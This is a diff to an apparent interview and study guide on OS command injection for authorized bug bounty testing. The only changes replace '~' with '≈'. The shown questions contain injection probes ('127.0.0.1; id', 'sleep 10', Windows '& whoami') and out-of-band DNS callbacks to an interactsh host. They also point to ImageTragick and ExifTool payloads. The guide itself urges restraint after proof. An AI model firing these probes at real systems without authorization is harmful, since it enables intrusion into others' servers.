@@ -44,7 +44,7 @@
 # LEVEL 0 — FUNDAMENTALS
 
 ### Q1. What is OS command injection?
-A flaw where user input is concatenated into a string that the application passes to an **operating-system shell** (or to a program with shell-style argument parsing), letting an attacker run their own commands on the server. The classic sink: `system("ping " + userHost)` with `userHost = "127.0.0.1; id"` runs `id`. The result is **Remote Code Execution (RCE)** — usually **Critical (CVSS ~9.8)**.
+A flaw where user input is concatenated into a string that the application passes to an **operating-system shell** (or to a program with shell-style argument parsing), letting an attacker run their own commands on the server. The classic sink: `system("ping " + userHost)` with `userHost = "127.0.0.1; id"` runs `id`. The result is **Remote Code Execution (RCE)** — usually **Critical (CVSS ≈9.8)**.
 
 > *Plain version:* the app is like a **clerk dictating a command to a robot that obeys every sentence.** It means to say `ping <your input>`, but you type `127.0.0.1; id`, so the clerk dictates *two* commands and the robot runs both. The `;` is punctuation that ends its command and starts yours. "RCE" (remote code execution) = you can run programs on their server — the top of the severity scale, because from there you reach their files, secrets, database, and cloud account.
 
@@ -92,7 +92,7 @@ Look for anything described as "ping/lookup/test/validate URL/trace/whois", any 
 ### Q10. What's the first test against a suspected sink?
 Baseline, then probe with benign markers across observability classes:
 1. In-band: `host=127.0.0.1;echo CMDI-7f3a9` → does `CMDI-7f3a9` appear?
-2. Time: `host=127.0.0.1;sleep 10` → ~10s slower (repeat to exclude jitter)?
+2. Time: `host=127.0.0.1;sleep 10` → ≈10s slower (repeat to exclude jitter)?
 3. OOB: `host=127.0.0.1;nslookup CMDI.<id>.oast.pro` → DNS hit at interactsh from the server IP?
 Whichever fires tells you the class and confirms execution.
 
@@ -565,7 +565,7 @@ PortSwigger Web Security Academy → **OS command injection** (do all labs: in-b
 
 ### Q101. Explain OS command injection to a junior in one minute — and what makes it Critical?
 *Plain:* "The app needs to run a system command — ping a host, resize an image, clone a repo — and it builds that command by **gluing your input into a string** and handing it to a shell. The shell treats certain characters (`;`, `|`, `&`, `` ` ``, `$()`) as 'start a new command,' so if my input reaches it unescaped, I can append **my own** command after theirs."
-*Why it's Critical:* the command runs with the **server's** privileges, so a successful injection is **remote code execution** — the top of almost every severity table (read files, reach cloud metadata for IAM creds, pivot internally). "It's `AV:N/AC:L/…/C:H/I:H/A:H` — usually ~9.8. A `;id` returning `uid=…` is a complete Critical."
+*Why it's Critical:* the command runs with the **server's** privileges, so a successful injection is **remote code execution** — the top of almost every severity table (read files, reach cloud metadata for IAM creds, pivot internally). "It's `AV:N/AC:L/…/C:H/I:H/A:H` — usually ≈9.8. A `;id` returning `uid=…` is a complete Critical."
 
 ### Q102. How is command injection different from code injection, SSTI, and SQLi?
 All are "attacker input reaches an interpreter," but the *interpreter* differs — and that changes your payloads and proof. **Command injection** → the **OS shell** (`;id`, `$(…)`). **Code injection** → the **language runtime** (`eval`, `system` in PHP/Python — you run *language* code, which can then shell out). **SSTI** → the **template engine** (`{{7*7}}` → often escalates *to* code/command execution). **SQLi** → the **database** (`' OR 1=1`, `UNION SELECT` — RCE only via DB features like `xp_cmdshell`).
@@ -634,7 +634,7 @@ Separators are dead, so pivot to **argument injection** — your value is an `ar
 Suspect a **Windows** target (cmd.exe/PowerShell) — `sh` separators and `sleep` are meaningless there. Confirm with Windows syntax: **`& ver`**, **`& echo %OS%`**, or `& whoami` (cmd uses `&`, `&&`, `|`, `||`, not `;`). For blind Windows, `& ping -n 10 127.0.0.1` (timing) or `& nslookup %COMPUTERNAME%.<id>.oast.pro` (OOB). "If `&ver`/`&whoami` suddenly returns output where `;id` did nothing, it's Windows — I switch to `&`/`|` separators, `^`/`\"\"` for char filters, and `powershell -enc` when quotes/spaces are blocked (§14.1)."
 
 ### Q118. You get a clean `id` → `uid=0(root)`. It's bug bounty. What exactly do you do next (and NOT do)?
-*Do:* capture the proof (`id`/`whoami`/`hostname`/`uname -a` output), take one screenshot, note the exact request, and **write the report** — root RCE is a maxed-out Critical (CWE-78, ~9.8–10). *Do not:* drop a reverse shell, read customer/PII data, plant a webshell or any persistence, pivot to internal systems, or "just check" the database — every one of those adds legal and operational risk **without adding bounty**, because RCE is already the top rung. If you wrote a test file, delete it and say so. "`id` (or an OOB `whoami`) is the whole finding — restraint here is what keeps an authorized test from becoming an incident (§13)."
+*Do:* capture the proof (`id`/`whoami`/`hostname`/`uname -a` output), take one screenshot, note the exact request, and **write the report** — root RCE is a maxed-out Critical (CWE-78, ≈9.8–10). *Do not:* drop a reverse shell, read customer/PII data, plant a webshell or any persistence, pivot to internal systems, or "just check" the database — every one of those adds legal and operational risk **without adding bounty**, because RCE is already the top rung. If you wrote a test file, delete it and say so. "`id` (or an OOB `whoami`) is the whole finding — restraint here is what keeps an authorized test from becoming an incident (§13)."
 
 ### Q119. An image-upload/avatar feature; no obvious command field. How do you test for command injection?
 This is a **processor sink** — the server likely hands your image to ImageMagick/Ghostscript/ExifTool/ffmpeg, any of which can shell out. Steps: **(1)** fingerprint the processor (behaviour, error strings, response headers, timing). **(2)** Upload a **crafted MVG/SVG** (ImageTragick, CVE-2016-3714) whose content triggers a delegate command, or a **DjVu/metadata** payload for ExifTool (CVE-2021-22204). **(3)** Make it **benign + OOB**: the payload should `nslookup`/`curl` your listener, not run a destructive command — a callback from the server proves RCE. **(4)** Use the FileUpload kit to pass the type check. "A 'change your avatar' feature is command injection wearing a different hat — the injection is the file's *contents* (§14, GitLab CVE-2021-22205 is the landmark)."
